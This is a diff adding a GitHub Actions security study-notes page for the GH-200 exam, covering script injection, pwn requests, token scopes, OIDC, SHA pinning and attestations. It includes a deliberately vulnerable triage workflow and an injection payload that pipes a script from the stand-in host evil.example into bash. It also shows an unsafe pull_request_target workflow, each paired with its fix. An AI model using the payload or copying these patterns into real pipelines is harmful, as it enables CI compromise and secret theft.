@@ -1,0 +1,618 @@
+---
+import NoteLayout from '../../layouts/NoteLayout.astro';
+import Callout from '../../components/Callout.astro';
+import CodeBlock from '../../components/CodeBlock.astro';
+import JobSteps from '../../components/JobSteps.astro';
+import Mermaid from '../../components/Mermaid.astro';
+import Step from '../../components/Step.astro';
+import { SITE } from '../../data/site';
+import { href } from '../../lib/urls';
+
+const gated = `
+flowchart LR
+  BUILD["build<br/>attest provenance"]:::success --> STG["deploy-staging<br/>environment: staging"]:::success
+  STG --> PROD["deploy-production<br/>environment: production<br/>waiting for review"]:::pending
+`;
+
+const injectable = `on:
+  issues:
+    types: [opened]
+
+permissions:
+  issues: write
+
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Label bugs  # VULNERABLE: the title is pasted into the script
+        env:
+          GH_TOKEN: \${{ github.token }}
+          GH_REPO: \${{ github.repository }}
+        run: |
+          title="\${{ github.event.issue.title }}"
+          if [[ "$title" == *bug* ]]; then
+            gh issue edit \${{ github.event.issue.number }} --add-label bug
+          fi`;
+
+const injectedLog = `::group::Run title="x"; curl -sSf https://evil.example/p.sh | bash; echo ""
+title="x"; curl -sSf https://evil.example/p.sh | bash; echo ""
+if [[ "$title" == *bug* ]]; then
+  gh issue edit 42 --add-label bug
+fi
+shell: /usr/bin/bash -e {0}
+env:
+  GH_TOKEN: ***
+  GH_REPO: octo-org/web
+::endgroup::`;
+
+const safe = `      - name: Label bugs  # SAFE: untrusted text arrives as data
+        env:
+          TITLE: \${{ github.event.issue.title }}
+          NUMBER: \${{ github.event.issue.number }}
+          GH_TOKEN: \${{ github.token }}
+          GH_REPO: \${{ github.repository }}
+        run: |
+          if [[ "$TITLE" == *bug* ]]; then
+            gh issue edit "$NUMBER" --add-label bug
+          fi`;
+
+const validate = `- name: Validate the version input before using it
+  env:
+    VERSION: \${{ inputs.version }}
+  run: |
+    if [[ ! "$VERSION" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+$ ]]; then
+      echo "::error::version must look like v1.2.3"
+      exit 1
+    fi`;
+
+const pwn = `on:
+  pull_request_target:            # base-repository token and secrets…
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}   # …running the fork's code
+          allow-unsafe-pr-checkout: true                     # checkout v7 refuses without this
+      - run: npm ci && npm test   # the PR controls package.json and the tests`;
+
+const permissionsYaml = `permissions: {}                  # workflow default: no scopes at all
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read             # just enough to check out
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          persist-credentials: false   # don't leave the token in the workspace
+      - run: npm ci && npm test
+
+  comment:
+    needs: test
+    runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write       # only this job may comment
+    steps:
+      - env:
+          GH_TOKEN: \${{ github.token }}
+          GH_REPO: \${{ github.repository }}
+          PR: \${{ github.event.pull_request.number }}
+        run: gh pr comment "$PR" --body "Tests passed"`;
+
+const appToken = `jobs:
+  release:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - id: app
+        uses: actions/create-github-app-token@v3
+        with:
+          client-id: \${{ vars.RELEASE_APP_CLIENT_ID }}   # app-id is deprecated
+          private-key: \${{ secrets.RELEASE_APP_KEY }}
+          repositories: web,docs      # narrow the installation token
+      - env:
+          GH_TOKEN: \${{ steps.app.outputs.token }}   # revoked when the job ends; its events DO trigger workflows
+        run: gh release create v2.4.0 --repo octo-org/web --generate-notes`;
+
+const azureOidc = `name: Deploy to Azure
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: production        # sub: repo:octo-org/web:environment:production
+    permissions:
+      contents: read
+      id-token: write              # allow this job to request an OIDC token
+    steps:
+      - uses: actions/checkout@v7
+      - uses: azure/login@a641126d1b8aa4d1fa005f4f92df94a3a4c4c906 # v3.1.0
+        with:
+          client-id: \${{ vars.AZURE_CLIENT_ID }}            # IDs, not secrets
+          tenant-id: \${{ vars.AZURE_TENANT_ID }}
+          subscription-id: \${{ vars.AZURE_SUBSCRIPTION_ID }}
+      - run: az webapp deploy --resource-group web-rg --name octo-web --src-path dist.zip`;
+
+const awsOidc = `jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/octo-web-deploy
+          aws-region: eu-west-1
+      - run: aws s3 sync ./dist s3://octo-web-site`;
+
+const awsTrust = `{
+  "Effect": "Allow",
+  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
+  "Action": "sts:AssumeRoleWithWebIdentity",
+  "Condition": {
+    "StringEquals": {
+      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+      "token.actions.githubusercontent.com:sub": "repo:octo-org/web:ref:refs/heads/main"
+    }
+  }
+}`;
+
+const oidcFlow = `
+flowchart LR
+  J["Job requests a token<br/>permissions: id-token: write"] --> G["GitHub OIDC provider<br/>signs a JWT: iss, aud, sub,<br/>repository, ref, environment"]
+  G --> C["Cloud identity service<br/>checks issuer, audience<br/>and subject against its trust"]
+  C --> T["Short-lived cloud token<br/>returned to the job"]
+`;
+
+const pinned = `steps:
+  - uses: actions/checkout@v7                                                  # first-party: major tag
+  - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
+  - uses: docker/login-action@8aa5831fb8d48d8f76594c7ddde61ae58019f550 # v4.8.0
+    with:
+      registry: ghcr.io
+      username: \${{ github.actor }}
+      password: \${{ secrets.GITHUB_TOKEN }}
+  - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
+    with:
+      push: true
+      tags: ghcr.io/octo-org/web:\${{ github.sha }}
+      cache-from: type=gha
+      cache-to: type=gha,mode=max`;
+
+const dependabot = `version: 2
+updates:
+  - package-ecosystem: github-actions   # keeps uses: references current — SHA pins included
+    directory: /
+    schedule:
+      interval: weekly
+    groups:
+      actions:
+        patterns: ['*']`;
+
+const lockfile = `gh extension install github/gh-actions-lock
+gh actions-lock                   # pin every action (and its dependencies) into actions.lock
+gh actions-lock --verify          # in CI: fail if the lockfile is stale or incomplete
+gh actions-lock --relock          # move pins forward after reviewing upstream changes`;
+
+const attest = `name: Release
+
+on:
+  push:
+    tags: ['v*']
+
+permissions:
+  contents: read
+
+jobs:
+  binary:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write              # mint the Sigstore signing certificate
+      attestations: write          # store the attestation
+    steps:
+      - uses: actions/checkout@v7
+      - run: make dist             # builds dist/web-linux-amd64
+      - uses: actions/attest@v4    # SLSA build provenance by default
+        with:
+          subject-path: dist/web-linux-amd64
+      - uses: actions/upload-artifact@v7
+        with:
+          name: web-linux-amd64
+          path: dist/web-linux-amd64
+
+  image:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      packages: write
+      id-token: write
+      attestations: write
+      artifact-metadata: write     # storage record for the pushed image
+    steps:
+      - uses: actions/checkout@v7
+      - uses: docker/login-action@8aa5831fb8d48d8f76594c7ddde61ae58019f550 # v4.8.0
+        with:
+          registry: ghcr.io
+          username: \${{ github.actor }}
+          password: \${{ secrets.GITHUB_TOKEN }}
+      - id: push
+        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
+        with:
+          push: true
+          tags: ghcr.io/octo-org/web:\${{ github.ref_name }}
+      - uses: actions/attest@v4
+        with:
+          subject-name: ghcr.io/octo-org/web
+          subject-digest: \${{ steps.push.outputs.digest }}
+          push-to-registry: true`;
+
+const verify = `# Verify a file against the repository that should have built it
+gh attestation verify dist/web-linux-amd64 --repo octo-org/web
+
+# Verify an image, and require that a specific reusable workflow signed it
+gh attestation verify oci://ghcr.io/octo-org/web:v2.4.0 \\
+  --owner octo-org \\
+  --signer-workflow octo-org/platform/.github/workflows/release.yml`;
+
+const verifyJob = `  deploy:
+    needs: binary
+    runs-on: ubuntu-latest
+    environment: production
+    permissions:
+      contents: read
+      attestations: read
+    steps:
+      - uses: actions/download-artifact@v8
+        with:
+          name: web-linux-amd64
+      - name: Refuse anything we did not build
+        env:
+          GH_TOKEN: \${{ github.token }}
+        run: gh attestation verify web-linux-amd64 --repo "$GITHUB_REPOSITORY"
+      - run: ./deploy.sh web-linux-amd64`;
+
+const supply = `
+flowchart LR
+  SRC["Source commit"] --> BLD["Build job<br/>actions/attest"]
+  BLD --> ATT["Attestation<br/>signed by Sigstore"]
+  BLD --> ART["Artifact or image"]
+  ART --> VER["Verify job<br/>gh attestation verify"]
+  ATT --> VER
+  VER --> DEP["Deploy"]
+`;
+
+const optimise = `on:
+  pull_request:
+    paths: ['src/**', 'package*.json', '.github/workflows/ci.yml']
+
+concurrency:                      # a new push cancels the run it replaces
+  group: ci-\${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    strategy:
+      matrix:
+        shard: [1, 2, 3, 4]       # split one slow suite four ways
+    steps:
+      - uses: actions/checkout@v7          # fetch-depth: 1 by default
+      - uses: actions/setup-node@v7
+        with:
+          node-version: 24
+          cache: npm
+      - run: npm ci --prefer-offline
+      - run: npx vitest run --shard=\${{ matrix.shard }}/4`;
+
+const cacheCleanup = `name: Clean PR caches
+
+on:
+  pull_request:
+    types: [closed]
+
+permissions:
+  actions: write
+
+jobs:
+  cleanup:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GH_TOKEN: \${{ github.token }}
+          GH_REPO: \${{ github.repository }}
+          REF: refs/pull/\${{ github.event.pull_request.number }}/merge
+        run: |
+          gh cache list --ref "$REF" --limit 100 --json id --jq '.[].id' |
+            xargs -r -n1 gh cache delete`;
+---
+
+<NoteLayout
+  slug="skill-5-secure-optimize"
+  description="GH-200 Skill 5, Secure and optimize automation: environment gates, trustworthy Marketplace actions, script injection and pwn requests, GITHUB_TOKEN permissions against PATs and GitHub Apps, OIDC federation with immutable subject claims, SHA pinning and workflow lockfiles, action policies, artifact attestations, and caching, retention and scaling for cost."
+  intro="The lightest skill by weight and the one that runs through every other. Gating deployments, choosing actions you can trust, keeping untrusted text out of your scripts, giving every token the least power it needs, replacing cloud secrets with OIDC, pinning what you run, proving what you built — and spending fewer minutes doing it."
+>
+  <!-- ================================================================= -->
+  <h2 id="implement-security-best-practices">Implement security best practices</h2>
+
+  <h3 id="environment-protections-and-approval-gates">Environment protections and approval gates</h3>
+  <Mermaid
+    code={gated}
+    variant="run"
+    caption="A gated release. build and deploy-staging succeeded; deploy-production is pending (amber border) until a required reviewer approves, the wait timer elapses and the branch rule matches. Only then are production's secrets released to the job."
+  />
+  <ul>
+    <li>Put production credentials in <strong>environment secrets</strong>, never repository secrets — a job only receives them after the environment's rules pass.</li>
+    <li>Combine <strong>required reviewers</strong> (with <strong>prevent self-review</strong>), <strong>deployment branches and tags</strong> (only <code>main</code> or <code>v*</code> tags may deploy) and, where needed, a <strong>wait timer</strong> or a <strong>custom deployment protection rule</strong> app.</li>
+    <li>Turn off <strong>allow administrators to bypass</strong> for environments that must bind everyone.</li>
+    <li>Scope the cloud trust to the environment (<code>sub: repo:org/repo:environment:production</code>) so a workflow that skips the environment cannot get production access at all.</li>
+  </ul>
+  <p>The rules themselves are listed in <a href={`${href('skill-1-author-workflows')}#environment-protections`}>Skill 1</a>.</p>
+
+  <h3 id="trustworthy-marketplace-actions">Identify and use trustworthy actions</h3>
+  <p>A third-party action runs with your job's token, secrets and network. Before you adopt one:</p>
+  <ul>
+    <li>Prefer <strong>GitHub-created</strong> actions (<code>actions/*</code>, <code>github/*</code>) and Marketplace actions from <strong>verified creators</strong> (the blue badge) — exactly the two groups the allowed-actions policy can allow wholesale.</li>
+    <li>Read the source and the <code>action.yml</code>: what does it run, what does it download, which inputs take tokens? A Docker action pulling <code>:latest</code> is as mutable as a branch.</li>
+    <li>Check maintenance — recent releases, a current <code>node24</code> runtime, issues answered, a security policy — and the action's own OpenSSF Scorecard if it publishes one.</li>
+    <li>Give the job only the <code>permissions</code> the action needs, and pass secrets only to the step that uses them.</li>
+    <li>Pin it to a full SHA, let Dependabot propose updates, and review the diff before merging them. For critical paths, fork it into your organisation.</li>
+    <li>GitHub's Advisory Database covers actions: <strong>Dependabot alerts</strong> flag vulnerable action versions, and <code>actions/dependency-review-action</code> flags new risky ones in pull requests.</li>
+  </ul>
+
+  <h3 id="mitigate-script-injection">Mitigate script injection</h3>
+  <p>
+    A <code>{'${{ }}'}</code> expression in <code>run:</code> is pasted into the script <strong>before</strong> the shell
+    sees it. If the value comes from someone outside your team — an issue title, a PR body, a branch name, a commit
+    message — they can write shell code.
+  </p>
+  <CodeBlock file=".github/workflows/triage.yml" code={injectable} />
+  <p>An issue titled <code>x"; curl -sSf https://evil.example/p.sh | bash; echo "</code> produces this script — visible in the log:</p>
+  <CodeBlock lang="log" title="Label bugs" status="failure" open code={injectedLog} />
+  <p>The fix is to pass untrusted values through the environment, where the shell treats them as data:</p>
+  <CodeBlock file=".github/workflows/triage.yml" excerpt code={safe} />
+  <div class="table-wrap">
+    <table class="tbl">
+      <thead><tr><th>Untrusted input</th><th>Examples</th></tr></thead>
+      <tbody>
+        <tr><td>Issue and PR text</td><td><code>github.event.issue.title</code>, <code>.body</code>, <code>github.event.pull_request.title</code>, <code>.body</code></td></tr>
+        <tr><td>Comments and reviews</td><td><code>github.event.comment.body</code>, <code>github.event.review.body</code></td></tr>
+        <tr><td>Git metadata</td><td><code>github.head_ref</code> and <code>pull_request.head.ref</code> (branch names), <code>head_commit.message</code>, author names and emails</td></tr>
+        <tr><td>Others</td><td><code>github.event.pages.*.page_name</code>, labels, wiki titles, discussion text, and any artifact or output produced by an untrusted run</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <ul>
+    <li><strong>Sanitise and validate</strong>: check inputs against an allow-list or a regular expression before use; reject rather than escape.</li>
+    <li><strong>Quote</strong> every variable in the shell (<code>"$TITLE"</code>), even from the environment.</li>
+    <li><strong>Least privilege</strong>: a read-only token turns a successful injection into a much smaller problem.</li>
+    <li><strong>Prefer a vetted action</strong> that takes the value as an input (passed as an argument, not interpolated into a script) over an inline script — <code>actions/github-script</code> with the value in <code>env</code>, for example.</li>
+    <li>Linters (actionlint, CodeQL's Actions queries, zizmor) flag expressions of untrusted contexts inside <code>run:</code>.</li>
+  </ul>
+  <CodeBlock lang="yaml" label="step" code={validate} />
+
+  <h3 id="pull-request-target-and-pwn-requests">pull_request_target and "pwn requests"</h3>
+  <p>
+    <code>pull_request_target</code> runs the <strong>default branch's</strong> workflow with the base repository's
+    write token and secrets — safe only as long as it never executes code from the pull request.
+  </p>
+  <CodeBlock file=".github/workflows/unsafe.yml" excerpt code={pwn} />
+  <ul>
+    <li><code>actions/checkout@v7</code> <strong>refuses</strong> to check out fork PR code under <code>pull_request_target</code> or <code>workflow_run</code> unless you set <code>allow-unsafe-pr-checkout: true</code> — treat that input as a red flag in review.</li>
+    <li>The safe pattern is two workflows: an unprivileged <code>pull_request</code> workflow runs the untrusted code and uploads results; a privileged <code>workflow_run</code> workflow reads them as data and comments or labels.</li>
+    <li>Treat artifacts and caches written by untrusted runs as untrusted too: a privileged job that restores them can be poisoned.</li>
+  </ul>
+
+  <h3 id="github-token-and-pats">GITHUB_TOKEN, PATs and GitHub App tokens</h3>
+  <p>
+    <code>GITHUB_TOKEN</code> is an installation token of the GitHub Actions app, <strong>created when each job
+    starts</strong>, scoped to the repository that runs the workflow, and <strong>revoked when the job ends</strong>
+    (24 hours at most). Its scopes come from the <code>permissions</code> key, or from the repository's default when the
+    key is absent.
+  </p>
+  <CodeBlock file=".github/workflows/pr.yml" excerpt code={permissionsYaml} />
+  <ul>
+    <li>Scopes: <code>actions</code>, <code>artifact-metadata</code>, <code>attestations</code>, <code>checks</code>, <code>contents</code>, <code>deployments</code>, <code>discussions</code>, <code>id-token</code>, <code>issues</code>, <code>models</code>, <code>packages</code>, <code>pages</code>, <code>pull-requests</code>, <code>security-events</code>, <code>statuses</code> — each <code>read</code>, <code>write</code> or <code>none</code>.</li>
+    <li>As soon as you list <strong>any</strong> scope, every unlisted one becomes <code>none</code> (except <code>metadata</code>, always read). <code>permissions: {'{}'}</code> removes them all; <code>read-all</code> and <code>write-all</code> exist but are rarely right.</li>
+    <li>Job-level <code>permissions</code> replace — not merge with — the workflow-level ones.</li>
+    <li>Fork pull requests always get a <strong>read-only</strong> token, whatever the workflow asks for.</li>
+    <li>The <strong>Set up job</strong> step logs the token's effective permissions.</li>
+  </ul>
+  <div class="table-wrap">
+    <table class="tbl">
+      <thead><tr><th></th><th><code>GITHUB_TOKEN</code></th><th>GitHub App installation token</th><th>Fine-grained PAT</th><th>Classic PAT</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Lifetime</strong></td><td>The job (≤ 24 h)</td><td>1 hour (the action revokes it when the job ends)</td><td>Up to the expiry you set</td><td>Optional expiry</td></tr>
+        <tr><td><strong>Scope</strong></td><td>This repository, per-scope permissions</td><td>The installation's repositories and permissions, narrowable</td><td>Selected repositories and permissions</td><td>Every repository the user can reach</td></tr>
+        <tr><td><strong>Acts as</strong></td><td><code>github-actions[bot]</code></td><td>The app (<code>name[bot]</code>)</td><td>The user</td><td>The user</td></tr>
+        <tr><td><strong>Triggers workflows?</strong></td><td>No (except dispatch events)</td><td>Yes</td><td>Yes</td><td>Yes</td></tr>
+        <tr><td><strong>Use for</strong></td><td>Almost everything in the repository</td><td>Cross-repository work, triggering workflows, org automation</td><td>Personal automation when an app is not possible</td><td>Avoid</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <CodeBlock file=".github/workflows/release.yml" excerpt code={appToken} />
+  <Callout type="exam" title="Restrict write scopes">
+    <p>
+      Set the organisation and repository default to <strong>read</strong>, give <code>write</code> only to the job that
+      needs it, and leave <strong>Allow GitHub Actions to create and approve pull requests</strong> off unless a workflow
+      genuinely needs it — with it on, an injected workflow could approve its own pull request.
+    </p>
+  </Callout>
+
+  <h3 id="oidc-cloud-federation">OIDC federation with cloud providers</h3>
+  <p>
+    Instead of storing a long-lived cloud key as a secret, a job asks GitHub's OIDC provider for a short-lived signed
+    token and exchanges it with the cloud for a short-lived access token. Nothing long-lived is stored in GitHub, and the
+    cloud decides — per repository, branch or environment — who may get in.
+  </p>
+  <Mermaid
+    code={oidcFlow}
+    caption="The job needs permissions: id-token: write. The cloud's trust policy matches the token's issuer (https://token.actions.githubusercontent.com), audience and subject claim."
+  />
+  <JobSteps job="Federate a workflow with Azure over OIDC">
+    <Step name="Create an identity in the cloud and grant it a role">
+      <p>A Microsoft Entra app registration or a user-assigned managed identity, with an RBAC role on just the resource group it deploys to.</p>
+    </Step>
+    <Step name="Add a federated credential that trusts GitHub" open>
+      <p>
+        Issuer <code>https://token.actions.githubusercontent.com</code>, audience <code>api://AzureADTokenExchange</code>,
+        and a subject that names exactly what may log in, such as <code>repo:octo-org/web:environment:production</code>.
+      </p>
+    </Step>
+    <Step name="Store the identifiers as variables">
+      <p>The client, tenant and subscription IDs are not secrets — keep them in <code>vars</code>. There is no client secret to store at all.</p>
+    </Step>
+    <Step name="Grant id-token: write to the deploying job">
+      <p>Only that job: other jobs cannot request a token.</p>
+    </Step>
+    <Step name="Log in with the cloud's action">
+      <CodeBlock file=".github/workflows/deploy-azure.yml" code={azureOidc} />
+    </Step>
+    <Step name="Check the subject and tighten it">
+      <p>
+        A failed login usually means the subject does not match. The new <strong>immutable subject</strong> format adds
+        owner and repository IDs; repositories created, renamed or transferred after 15 July 2026 use it automatically,
+        and the cloud's subject must match it.
+      </p>
+    </Step>
+  </JobSteps>
+  <div class="table-wrap">
+    <table class="tbl">
+      <thead><tr><th>Job context</th><th>Subject (<code>sub</code>) claim</th></tr></thead>
+      <tbody>
+        <tr><td>Job with an environment</td><td><code>repo:octo-org/web:environment:production</code> — takes precedence over the ref</td></tr>
+        <tr><td>Push to a branch</td><td><code>repo:octo-org/web:ref:refs/heads/main</code></td></tr>
+        <tr><td>Tag</td><td><code>repo:octo-org/web:ref:refs/tags/v2.4.0</code></td></tr>
+        <tr><td>Pull request</td><td><code>repo:octo-org/web:pull_request</code></td></tr>
+        <tr><td>Immutable format (new repositories)</td><td><code>repo:octo-org@123456/web@456789:environment:production</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p>
+    The token also carries claims such as <code>repository</code>, <code>repository_owner</code>, <code>ref</code>,
+    <code>environment</code>, <code>workflow_ref</code> and <code>job_workflow_ref</code>; an organisation or repository
+    can <strong>customise the subject template</strong> through the API to include them. The same pattern works for AWS
+    and Google Cloud:
+  </p>
+  <CodeBlock file=".github/workflows/deploy-aws.yml" excerpt code={awsOidc} />
+  <CodeBlock lang="json" label="IAM role trust policy" code={awsTrust} />
+
+  <h3 id="pin-actions-to-a-full-commit-sha">Pin actions to a full commit SHA</h3>
+  <p>
+    Tags and branches can be moved — by the maintainer, or by whoever compromises the maintainer. A full 40-character
+    commit SHA cannot. Pin <strong>third-party</strong> actions to a SHA with the version in a trailing comment, so
+    people and Dependabot can still read and update it:
+  </p>
+  <CodeBlock file=".github/workflows/image.yml" excerpt code={pinned} />
+  <Callout type="note" title="Why these notes use majors for actions/* and SHAs for everything else">
+    <p>
+      Throughout these notes, first-party <code>actions/*</code> samples use major tags (<code>@v7</code>) so the
+      samples stay readable; every third-party action is pinned to a full SHA with its version in a comment. In your own
+      workflows, the safest choice is to pin <strong>all</strong> actions — the SHA pinning policy does not exempt
+      GitHub's own.
+    </p>
+  </Callout>
+  <ul>
+    <li>Avoid <code>@main</code> and floating <code>@v*</code> for third-party actions unless you have a reason (and say so in a comment).</li>
+    <li>A SHA from a <strong>fork</strong> of the action's repository resolves too — check that the SHA belongs to the upstream repository.</li>
+    <li>Enforce it with the allowed-actions <strong>Require actions to be pinned to a full-length commit SHA</strong> policy.</li>
+    <li>Pinning the top level does not pin what an action itself pulls in. A <strong>workflow lockfile</strong> records transitive dependencies too:</li>
+  </ul>
+  <CodeBlock lang="bash" label="gh actions-lock" code={lockfile} />
+  <CodeBlock lang="yaml" file=".github/dependabot.yml" code={dependabot} />
+  <p>
+    The study guide's "immutable actions enforcement on hosted runners" refers to a rollout that GitHub withdrew in
+    December 2025; <a href={`${href('skill-3-author-actions')}#immutable-actions-and-what-shipped-instead`}>Skill 3</a>
+    explains what replaced it. Checked on {SITE.checked}.
+  </p>
+
+  <h3 id="enforce-action-usage-policies">Enforce action usage policies</h3>
+  <ul>
+    <li><strong>Allow and deny lists</strong>: at enterprise, organisation or repository level, allow only your own actions plus GitHub-created, verified-creator and named patterns, and block specific ones with <code>!owner/repo@*</code>. The details are in <a href={`${href('skill-4-enterprise')}#organizational-use-policies`}>Skill 4</a>.</li>
+    <li><strong>SHA pinning</strong> and <strong>Require lockfile</strong> policies make unpinned references fail.</li>
+    <li><strong>Review before an unverified action is used</strong>: there is no single switch for this. The usual design is a policy that allows only verified creators and approved patterns — so a new action needs an admin to add it — plus <strong>CODEOWNERS</strong> on <code>/.github/workflows/</code> and <code>/.github/actions/</code> with a ruleset requiring code-owner review, so a security team approves every workflow change that introduces one.</li>
+    <li><strong>Fork PR approvals</strong> stop outside contributors' workflows running until a maintainer approves them.</li>
+  </ul>
+
+  <h3 id="artifact-attestations">Artifact attestations and provenance</h3>
+  <p>
+    An <strong>artifact attestation</strong> is a signed statement binding an artifact's digest to how it was built:
+    the repository, workflow, commit, trigger and runner — <strong>SLSA build provenance</strong>. Signing uses a
+    short-lived Sigstore certificate obtained with the job's OIDC token: the public-good Sigstore instance for public
+    repositories, GitHub's private instance for private and internal ones (GitHub Enterprise Cloud).
+  </p>
+  <Mermaid
+    code={supply}
+    caption="Provenance end to end: the build job attests what it produced, and a separate verify step refuses to deploy anything whose attestation does not check out."
+  />
+  <CodeBlock file=".github/workflows/release.yml" code={attest} />
+  <ul>
+    <li><code>actions/attest@v4</code> is the current action: build provenance by default, an <strong>SBOM</strong> attestation with <code>sbom-path</code>, or a custom predicate. <code>actions/attest-build-provenance</code> v4 is now a thin wrapper around it.</li>
+    <li>Permissions: <code>id-token: write</code> and <code>attestations: write</code>; add <code>artifact-metadata: write</code> when pushing an image's attestation to the registry.</li>
+    <li>Attestations appear in the repository's <strong>Attestations</strong> page and the run summary.</li>
+  </ul>
+  <CodeBlock lang="bash" label="gh attestation" code={verify} />
+  <CodeBlock file=".github/workflows/release.yml" excerpt code={verifyJob} />
+  <Callout type="tip" title="Reusable workflows raise the SLSA level">
+    <p>
+      If every release is built by one reusable workflow owned by a platform team, verify with
+      <code>--signer-workflow</code>: an attacker who can edit a repository's own workflow still cannot produce an
+      attestation signed by the central one. For Kubernetes, an admission controller can run the same check before a pod
+      starts.
+    </p>
+  </Callout>
+
+  <!-- ================================================================= -->
+  <h2 id="optimize-performance-and-cost">Optimize workflow performance and cost</h2>
+
+  <h3 id="caching-and-retention-for-efficiency">Caching and artifact retention for efficiency</h3>
+  <ul>
+    <li>Cache dependencies (<code>setup-*</code> <code>cache:</code> or <code>actions/cache</code>), keyed on lockfiles, so installs are restores rather than downloads.</li>
+    <li>Cache container layers with <code>cache-from: type=gha</code> and <code>cache-to: type=gha,mode=max</code>.</li>
+    <li>Build once and pass the result as an <strong>artifact</strong> to test and deploy jobs instead of rebuilding in each.</li>
+    <li>Keep artifacts only as long as they are useful: short <code>retention-days</code> for PR builds, a lower repository or organisation default set through the retention API (<a href={`${href('skill-1-author-workflows')}#retention-policies-via-the-rest-api`}>Skill 1</a>), and early deletion of what nobody needs.</li>
+    <li>Delete caches for merged pull requests, which nothing will restore again:</li>
+  </ul>
+  <CodeBlock file=".github/workflows/cache-cleanup.yml" code={cacheCleanup} />
+
+  <h3 id="scaling-and-optimizing-workflows">Strategies for scaling and optimising</h3>
+  <CodeBlock file=".github/workflows/ci.yml" excerpt code={optimise} />
+  <div class="table-wrap">
+    <table class="tbl">
+      <thead><tr><th>Lever</th><th>Saves</th></tr></thead>
+      <tbody>
+        <tr><td><code>paths</code> / <code>paths-ignore</code> and job-level <code>if:</code></td><td>Runs that would test nothing that changed</td></tr>
+        <tr><td><code>concurrency</code> with <code>cancel-in-progress</code></td><td>Superseded PR runs; <code>queue: max</code> instead for deployments that must all happen in order</td></tr>
+        <tr><td><code>timeout-minutes</code></td><td>Hung jobs burning up to six hours</td></tr>
+        <tr><td>Parallel jobs and test sharding</td><td>Wall-clock time (not minutes)</td></tr>
+        <tr><td>Smaller matrices on PRs, full on <code>main</code></td><td>Minutes on every push</td></tr>
+        <tr><td>Linux and Arm64 runners for portable work</td><td>Per-minute cost — Windows and macOS minutes cost more</td></tr>
+        <tr><td>Larger runners for heavy builds</td><td>Time; can cost less overall if the job finishes much sooner</td></tr>
+        <tr><td>Ephemeral, autoscaled self-hosted runners (ARC)</td><td>Idle machines; capacity beyond hosted concurrency limits</td></tr>
+        <tr><td>Shallow checkout (the default <code>fetch-depth: 1</code>)</td><td>Clone time on big repositories</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p>
+    Measure before tuning: <strong>Actions usage metrics</strong> show where the minutes go, <strong>Actions performance
+    metrics</strong> show queue time and failure rates, and concurrency limits per plan (20 jobs on Free, 40 on Pro, 60
+    on Team, 500 on Enterprise for standard runners) explain jobs that queue.
+  </p>
+</NoteLayout>
